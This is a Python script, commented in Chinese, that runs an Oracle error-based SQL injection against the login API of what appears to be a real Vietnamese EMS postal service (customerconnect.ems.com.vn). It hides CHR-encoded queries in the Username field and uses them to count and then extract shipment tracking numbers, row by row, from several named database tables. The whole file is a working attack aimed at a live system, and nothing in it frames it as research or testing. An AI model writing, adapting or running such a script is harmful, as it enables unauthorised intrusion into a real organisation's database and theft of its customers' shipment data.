#!/usr/bin/env python3
"""
提取EMS格式的真实运单号（E开头+VN结尾）
"""

import requests
import json
import time

class EMSTrackingExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def count_ems_format_tracking(self):
        """统计EMS格式的运单号"""
        print("=" * 80)
        print("📊 统计EMS格式运单号（E开头VN结尾）")
        print("=" * 80)
        
        date = '20251010'
        
        # 查询不同表中的EMS格式运单号
        queries = [
            ("SHIPMENT表", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CODE LIKE 'E%VN'"),
            ("E1E2_PH表", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE 'E%VN'"),
            ("JOURNEYTOKEN表", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'"),
            ("PARTNER_WEBHOOK表", f"SELECT COUNT(DISTINCT TRACKING_CODE) FROM EMS.PARTNER_MCS_WEBHOOK WHERE TRACKING_CODE LIKE 'E%VN'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result:>10} 个EMS运单号")
            time.sleep(2)
    
    def extract_ems_tracking_numbers(self):
        """提取EMS格式运单号"""
        print(f"\n\n{'='*80}")
        print("📦 提取EMS运单号（前100个）")
        print(f"{'='*80}")
        
        date = '20251010'
        
        # 从E1E2_PH表提取
        print(f"\n从E1E2_PH表提取MABC（E开头VN结尾）:")
        
        count = 0
        for i in range(1, 201):
            query = f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE 'E%VN' ORDER BY MABC) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                count += 1
                if count <= 50:
                    print(f"{count}. {result}")
            
            if i % 20 == 0 and count > 0:
                print(f"\n已找到 {count} 个...")
            
            time.sleep(0.2)
        
        print(f"\n✅ E1E2_PH表共找到 {count} 个EMS运单号")
        
        # 从JOURNEYTOKEN表提取
        print(f"\n\n从JOURNEYTOKEN表提取:")
        
        count2 = 0
        for i in range(1, 101):
            query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                count2 += 1
                if count2 <= 30:
                    print(f"{count2}. {result}")
            
            time.sleep(0.2)
        
        print(f"\n✅ JOURNEYTOKEN表共找到 {count2} 个EMS运单号")
        
        # 从Webhook表提取
        print(f"\n\n从PARTNER_WEBHOOK表提取（最新的）:")
        
        count3 = 0
        for i in range(1, 101):
            query = f"SELECT TRACKING_CODE FROM (SELECT DISTINCT TRACKING_CODE FROM EMS.PARTNER_MCS_WEBHOOK WHERE TRACKING_CODE LIKE 'E%VN' ORDER BY ID DESC) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                count3 += 1
                if count3 <= 30:
                    print(f"{count3}. {result}")
            
            time.sleep(0.2)
        
        print(f"\n✅ Webhook表共找到 {count3} 个EMS运单号")
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.count_ems_format_tracking()
        self.extract_ems_tracking_numbers()
        
        print("\n" + "=" * 80)
        print("✅ 提取完成")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = EMSTrackingExtractor(target_url)
    extractor.run()
